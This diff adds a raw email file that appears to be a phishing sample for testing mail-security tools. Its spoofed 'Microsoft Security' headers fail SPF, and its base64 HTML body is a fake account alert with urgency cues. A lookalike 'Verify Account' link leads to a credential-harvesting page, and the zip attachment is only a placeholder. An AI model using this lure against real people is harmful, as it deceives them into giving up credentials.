@@ -1,0 +1,62 @@
+Return-Path: <security@microsoft-com.support>
+Received: from mailserver01.provider.net (mailserver01.provider.net [192.168.1.100])
+	by mx.google.com with ESMTPS id abc123def456
+	for <user@example.com>; Mon, 15 Jan 2024 14:30:22 +0400
+From: Microsoft Security <security@microsoft-com.support>
+To: User <user@example.com>
+Subject: Urgent: Suspicious Activity Detected on Your Account
+Date: Mon, 15 Jan 2024 14:28:15 +0400
+Message-ID: <20240115142815.12345@microsoft-com.support>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="----=_NextPart_000_ABCD_12345678"
+X-Mailer: Microsoft Outlook 16.0
+X-Priority: 1 (High)
+Authentication-Results: google.com; spf=fail smtp.mailfrom=microsoft-com.support
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_ABCD_12345678
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: base64
+
+PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8
+bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+QWNjb3VudCBTZWN1
+cml0eSBBbGVydDwvdGl0bGU+CiAgICA8c3R5bGU+CiAgICAgICAgYm9keSB7
+IGZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsgbWFyZ2luOiAwOyBw
+YWRkaW5nOiAyMHB4OyB9CiAgICAgICAgLmNvbnRhaW5lciB7IG1heC13aWR0
+aDogNjAwcHg7IG1hcmdpbjogMCBhdXRvOyBiYWNrZ3JvdW5kLWNvbG9yOiAj
+ZmZmOyBwYWRkaW5nOiAzMHB4OyB9CiAgICAgICAgLmhlYWRlciB7IHRleHQt
+YWxpZ246IGNlbnRlcjsgbWFyZ2luLWJvdHRvbTogMzBweDsgfQogICAgICAg
+IC5idG4geyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDA3OEQ3OyBjb2xvcjogd2hp
+dGU7IHBhZGRpbmc6IDE1cHggMzBweDsgdGV4dC1kZWNvcmF0aW9uOiBub25l
+OyBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7IG1hcmdpbi10b3A6IDIwcHg7IH0K
+ICAgIDwvc3R5bGU+CjwvaGVhZD4KPGJvZHk+CiAgICA8ZGl2IGNsYXNzPSJj
+b250YWluZXIiPgogICAgICAgIDxkaXYgY2xhc3M9ImhlYWRlciI+CiAgICAg
+ICAgICAgIDxoMT5TdXNwaWNpb3VzIEFjdGl2aXR5IERldGVjdGVkPC9oMT4K
+ICAgICAgICA8L2Rpdj4KICAgICAgICA8cD5EZWFyIFVzZXIsPC9wPgogICAg
+ICAgIDxwPldlIGRldGVjdGVkIHVudXN1YWwgYWN0aXZpdHkgb24geW91ciBN
+aWNyb3NvZnQgYWNjb3VudCBmcm9tIGEgbmV3IGRldmljZSBhdCA8c3Ryb25n
+PjE5Mi4wLjIuMTU8L3N0cm9uZz4gKExvY2F0aW9uOiBNb3Njb3csIFJ1c3Np
+YSkgb24gSmFudWFyeSAxNSwgMjAyNCBhdCAyOjE1IFBNIFVUQy48L3A+CiAg
+ICAgICAgPHA+SWYgdGhpcyB3YXMgeW91LCB5b3UgY2FuIGlnbm9yZSB0aGlz
+IGFsZXJ0LiBPdGhlcndpc2UsIHdlIHJlY29tbWVuZCB5b3UgdG8gc2VjdXJl
+IHlvdXIgYWNjb3VudCBpbW1lZGlhdGVseS48L3A+CiAgICAgICAgPHA+UGxl
+YXNlIGNsaWNrIHRoZSBidXR0b24gYmVsb3cgdG8gdmVyaWZ5IHlvdXIgYWNj
+b3VudDo8L3A+CiAgICAgICAgPHA+PGEgaHJlZj0iaHR0cHM6Ly9taWNyb3Nv
+ZnQtc2VjdXJpdHkudmVyaWZ5LmNvbS91c2VyP3Rva2VuPWFiY2RlZjEyMzQ1
+IiBjbGFzcz0iYnRuIj5WZXJpZnkgQWNjb3VudDwvYT48L3A+CiAgICAgICAg
+PHA+QWx0ZXJuYXRpdmVseSwgeW91IGNhbiB2aXNpdDogPGJyPmh0dHBzOi8v
+c2VjdXJpdHkubWljcm9zb2Z0LmNvbS92ZXJpZnk8L3A+CiAgICAgICAgPHA+
+VGhpcyBzZWN1cml0eSBhbGVydCB3aWxsIGV4cGlyZSBpbiAyNCBob3Vycy48
+L3A+CiAgICAgICAgPHA+U2luY2VyZWx5LDxiciZTZWN1cml0eSBUZWFtPGJy
+Pk1pY3Jvc29mdCBDb3Jwb3JhdGlvbjwvcD4KICAgIDwvZGl2Pgo8L2JvZHk+
+CjwvaHRtbD4K
+
+------=_NextPart_000_ABCD_12345678
+Content-Type: application/zip; name="Security_Update_2024.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Security_Update_2024.zip"
+
+UEsDBBQAAAAIA...
+[Base64 encoded zip file content would be here]
+------=_NextPart_000_ABCD_12345678--
